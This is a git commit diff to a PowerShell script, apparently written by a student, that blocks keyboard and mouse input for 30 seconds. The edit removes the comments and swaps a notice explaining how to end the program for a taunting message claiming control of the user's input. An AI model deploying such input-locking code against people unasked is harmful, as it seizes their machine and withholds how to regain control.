af82b31c3c0f2289f06e6a66ddd79e5f5cbe075c
unknown <Student@SIOP0202-EDU-06.EPTM.lan>
2025-08-29 16:07:42 +0200

    Changement sur le script powershell 2

--- powershell/script_killer.ps1
+++ powershell/script_killer.ps1
@@ -8,19 +8,15 @@ public class BlockInputHelper {
 }
 "@
 
-# Durée du blocage en secondes
 $blockDurationSeconds = 30
 
-Write-Host "Le clavier et la souris seront bloqués pour $blockDurationSeconds secondes. Pour arrêter, fermez le programme dans le gestionnaire des tâches." -ForegroundColor Red
+Write-Host "Toute action est inutile, j'ai l'emprise sur ton clavier et ta souris. pour $blockDurationSeconds" -ForegroundColor Red
 
-# Bloque le clavier et la souris
 [BlockInputHelper]::BlockInput($true)
 
 try {
-    # Attend la durée spécifiée
     Start-Sleep -Seconds $blockDurationSeconds
 } finally {
-    # Débloque le clavier et la souris, peu importe ce qui se passe
     [BlockInputHelper]::BlockInput($false)
     Write-Host "Le clavier et la souris sont maintenant débloqués." -ForegroundColor Green
 }
